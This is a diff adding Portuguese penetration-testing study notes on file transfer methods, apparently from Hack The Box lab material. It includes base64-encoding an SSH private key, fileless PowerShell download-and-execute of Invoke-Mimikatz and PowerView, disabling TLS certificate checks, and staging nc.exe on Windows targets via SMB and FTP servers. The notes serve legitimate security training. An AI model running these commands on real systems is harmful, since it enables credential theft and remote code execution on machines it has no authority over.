@@ -26,10 +26,120 @@ MAQUINA ALVO USANDO SCP
 
  MAQUINA HOST
 -
-Gust4vo@htb[/htb]$ base64 shell -w 0 </br>
-f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU </br>
+Gust4vo@htb[/htb]$ cat id_rsa |base64 -w 0;echo
+</br>
 
 MAQUINA ALVO USANDO BASE64
  -
 user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
 
+---
+
+# Métodos de transferência de arquivos do Windows
+
+### Método PowerShell DownloadFile
+
+- PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
+- PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
+
+### PowerShell Invoke-Expression DownloadString - Método Fileless
+
+- PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+
+### PowerShell Invoke-WebRequest
+
+A partir do PowerShell 3.0, o Invocar-WebRequest O cmdlet também está disponível, mas é visivelmente mais lento para baixar arquivos. Você pode usar os aliases iwr, curl, e wget em vez do Invoke-WebRequest nome completo.
+
+- PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+
+</br>
+Harmj0y compilou uma extensa lista de berços de download do PowerShell: https://gist.github.com/HarmJ0y/bb48307ffa663256e239
+
+### Erros comuns com o PowerShell
+
+Pode haver casos em que a configuração de lançamento inicial do Internet Explorer não tenha sido concluída, o que impede o download. Isso pode ser ignorado usando o parâmetro -UseBasicParsing.
+
+``` ps1
+PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
+
+Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
+At line:1 char:1
++ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
++ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+
+PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
+```
+
+Outro erro nos downloads do PowerShell está relacionado ao canal seguro SSL/TLS se o certificado não for confiável. Podemos contornar esse erro com o seguinte comando:
+
+``` ps1
+PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+```
+
+### Downloads SMB
+
+- Podemos usar o SMB para baixar arquivos do nosso Pwnbox facilmente. Precisamos criar um servidor SMB em nosso Pwnbox com servidor smbserver.py do Impacket e depois usar copy, move, PowerShell Copy-Item, ou qualquer outra ferramenta que permita a conexão com SMB.
+
+#### Criar o Servidor SMB
+
+```
+Gust4vo@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+
+- Para baixar um arquivo do servidor SMB para o diretório de trabalho atual, podemos usar o seguinte comando:
+
+```
+C:\htb> copy \\192.168.220.133\share\nc.exe
+
+        1 file(s) copied.
+```
+
+- Novas versões do Windows bloqueiam o acesso não autenticado de convidados, como podemos ver no seguinte comando:
+
+```
+C:\htb> copy \\192.168.220.133\share\nc.exe
+
+You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
+```
+
+- Para transferir arquivos neste cenário, podemos definir um nome de usuário e uma senha usando nosso servidor Impacket SMB e montar o servidor SMB em nossa máquina de destino Windows:
+
+```
+Gust4vo@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+```
+C:\htb> net use n: \\192.168.220.133\share /user:test test
+
+The command completed successfully.
+
+C:\htb> copy n:\nc.exe
+        1 file(s) copied.
+```
+
+### Downloads via FTP
+
+- Podemos configurar um servidor FTP em nosso host de ataque usando Python3 pyftpdlib módulo. Pode ser instalado com o seguinte comando:
+
+```
+Gust4vo@htb[/htb]$ sudo pip3 install pyftpdlib
+```
